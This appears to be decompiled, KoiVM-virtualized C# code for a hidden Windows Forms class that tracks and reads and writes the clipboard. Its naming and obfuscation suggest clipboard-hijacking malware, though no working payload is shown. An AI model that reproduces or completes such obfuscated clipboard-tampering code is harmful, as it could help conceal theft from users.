using System;
using System.Windows.Forms;
using KoiVM.Runtime;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard;

		protected override CreateParams CreateParams => (CreateParams)VMEntry.Run(typeof(NotificationForm).TypeHandle, 26u, new object[1] { this });

		public NotificationForm()
		{
			VMEntry.Run(typeof(NotificationForm).TypeHandle, 24u, new object[1] { this });
		}

		protected unsafe override void WndProc(ref Message m)
		{
			//IL_002e: Expected I, but got O
			void*[] array = new void*[2];
			TypedReference typedReference = __makeref(this);
			array[0] = &typedReference;
			TypedReference typedReference2 = __makeref(m);
			array[1] = &typedReference2;
			VMEntry.Run(typeof(NotificationForm).TypeHandle, 25u, array, (void*)unchecked((nint)null));
		}

		public static string GetText()
		{
			return (string)VMEntry.Run(typeof(NotificationForm).TypeHandle, 28u, new object[0]);
		}

		public static void SetText(string txt)
		{
			VMEntry.Run(typeof(NotificationForm).TypeHandle, 29u, new object[1] { txt });
		}

		static NotificationForm()
		{
			VMEntry.Run(typeof(NotificationForm).TypeHandle, 30u, new object[0]);
		}
	}

	public driveNotification()
	{
		VMEntry.Run(typeof(driveNotification).TypeHandle, 23u, new object[1] { this });
	}
}
